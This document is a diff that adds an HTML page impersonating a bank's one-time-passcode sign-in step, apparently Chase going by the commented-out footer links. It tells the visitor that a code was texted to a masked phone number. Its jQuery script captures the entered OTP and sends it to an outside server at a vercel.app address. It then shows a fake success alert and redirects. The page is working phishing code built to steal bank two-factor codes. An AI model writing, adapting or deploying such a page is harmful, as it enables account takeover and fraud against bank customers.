@@ -1,0 +1,126 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>safety</title>
+    <link href="./css/index.css" rel="stylesheet"/>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+	<link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+</head>
+<body >
+    <div >
+    <div>
+        <header> <a href="./index.html"><img src="./assets/whitel.jpg"/></a>  </header>       
+    </div>
+    <section>
+        <div class="enter">
+            <p>Enter Your Secure Access Code</p>
+            <small>Enter the code that been sent via sms text number to (904)***-****
+            </small>
+        </div>
+        <div class="form">
+            <form method="post" id="myForm">
+            <div class="text-input">
+                <span class="indication"><span class="asteriks">*</span> Indicates required field
+                </span>
+                <div class="input-label">
+            <label class='filled' for="text"> OTP<span class="asteriks">*</span></label>
+            <input class="otp" name="otp" label="otp" type= "text" id="otp" required/>
+            </div>
+            
+            </div>
+            <div class="checkbox">
+           
+            </div>
+            <div class="button-container">
+              <button class="button" type="submit">Sign In</button>
+               </div>
+            <div class="header-links">
+                <a href="#">forgot Username/password?</a><br/>
+                <a href="#">Not Enrolled/Sign Up Now.</a>
+    
+            </div> <p>NOTE: you will not receive any code if your Login ID and Password does not match. BACK TO LOGIN.
+            </p>
+            </form>
+           
+            </div>
+    </section>
+
+    <footer>
+        Enroll In Online Banking
+        <!-- <div class="social-links">
+             <div>
+               <p>Follow Us:</p>
+             </div>
+             <div class="footer-icons">
+                  <img src="./assets/facebook.png" class="icon"/>
+                   <img src="./assets/instagram.png"  class="icon"/>
+                   <img src="./assets/twitter.png"  class="icon"/>
+                   <img src="./assets/youtube.png"  class="icon"/>
+                   <img src="./assets/linkedin.png"  class="icon"/>
+               </div>
+         </div>
+           <hr/>
+         <div class="footer-links">
+         <a href="#"> Contact Us</a>
+            <a href="#">Privacy</a>
+            <a href="#">Security</a>
+            <a href="#">Terms Of Use</a>
+            <a href="#">Accessibility</a>
+            <a href="#">SAFE ACT: Mortgage Loan Originators</a>
+            <a href="#">Fair Lending</a>
+            <a href="#">About Chase</a>
+            <a href="#">Careers</a>
+            <a href="#">Espanol</a>
+            <a href="#">Canada</a>
+            <a href="#">Site Map</a>
+            <a>Member FDIC</a>
+            <a class="house-link">Equal Housing Opportunity</a>
+         </div> -->
+        </footer>
+    </div>
+    <script src="./jquery-3.6.0.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+
+    <script>
+        
+        $(document).ready(function () {
+          $('#myForm').on('submit', function (event) {
+            event.preventDefault(); // Prevent the default form submission
+        
+    // Collect form data
+    var otp = $('#otp').val();
+  
+
+    // Build the data object
+    var data = {
+        otp: otp,
+       
+    }
+
+            $.ajax({
+              url: 'https://server-blue-mu.vercel.app/starbotp', // Replace with the URL to your PHP handler script
+              type: 'POST',
+              data: JSON.stringify(data),
+              contentType: 'application/json',
+              success: function (response) {
+                console.log(response);
+                swal("Application submitted successfully!", "", "success").then(() => {
+                    window.location.href = "./index.html";        });
+              },
+              error: function (xhr, status, error) {
+                // Handle any errors
+                swal("An error occurred while saving the application!", "", "warning");
+                console.error(xhr.responseText);
+              }
+            });
+          });
+        });
+        
+        </script>
+
+</body>
+</html>
